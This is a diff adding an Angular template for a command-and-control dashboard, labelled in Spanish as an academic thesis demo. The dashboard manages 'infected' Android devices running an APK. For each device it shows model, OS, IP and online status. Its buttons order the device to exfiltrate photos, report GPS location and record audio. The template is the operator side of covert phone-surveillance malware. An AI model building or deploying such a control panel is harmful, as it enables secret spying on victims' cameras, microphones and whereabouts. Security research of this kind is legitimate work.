@@ -1,0 +1,73 @@
+<div class="c2-container">
+  <header class="dashboard-header">
+    <div class="logo-area">
+      <h1>☠️ C2 CONTROL CENTER</h1>
+      <span class="subtitle">Tesis de Seguridad Informática - Demo Académica</span>
+    </div>
+    <div class="server-status">
+      <span class="pulse"></span> SERVIDOR .NET: <strong>ONLINE (Port 7112)</strong>
+    </div>
+  </header>
+
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="icon">📱</div>
+      <div class="info">
+        <h3>{{ devices.length }}</h3>
+        <p>Dispositivos Infectados</p>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="icon green">🟢</div>
+      <div class="info">
+        <h3>{{ getOnlineCount() }}</h3>
+        <p>Activos Ahora</p>
+      </div>
+    </div>
+    <div class="stat-card">
+      <div class="icon yellow">📂</div>
+      <div class="info">
+        <button class="btn-evidence" (click)="openEvidenceFolder()">Ver Evidencias</button>
+      </div>
+    </div>
+  </div>
+
+  <h2 class="section-title">Dispositivos Conectados</h2>
+  
+  <div class="devices-grid" *ngIf="devices.length > 0; else noDevices">
+    <div class="device-card" *ngFor="let device of devices" [class.offline]="!device.isOnline">
+      <div class="card-header">
+        <span class="device-id">{{ device.deviceId }}</span>
+        <span class="status-badge" [class.online]="device.isOnline">
+          {{ device.isOnline ? 'ONLINE' : 'OFFLINE' }}
+        </span>
+      </div>
+      
+      <div class="card-body">
+        <p><strong>Modelo:</strong> {{ device.model }}</p>
+        <p><strong>OS:</strong> {{ device.osVersion }}</p>
+        <p><strong>IP:</strong> {{ device.ipAddress }}</p>
+        <p class="last-seen">Visto: {{ device.lastSeen | date:'shortTime' }}</p>
+      </div>
+
+      <div class="card-actions">
+        <button class="btn-hack photo" (click)="sendCommand(device.deviceId, 'TAKE_PHOTO')">
+          📸 Exfiltrar Fotos
+        </button>
+        <button class="btn-hack gps" (click)="sendCommand(device.deviceId, 'GET_LOCATION')">
+          📍 Obtener GPS
+        </button>
+        <button class="btn-hack audio" (click)="sendCommand(device.deviceId, 'RECORD_AUDIO')">
+          🎤 Grabar Audio
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <ng-template #noDevices>
+    <div class="empty-state">
+      <p>⚠️ No hay dispositivos infectados conectados.</p>
+      <small>Instala el APK en el emulador para ver datos aquí.</small>
+    </div>
+  </ng-template>
+</div>
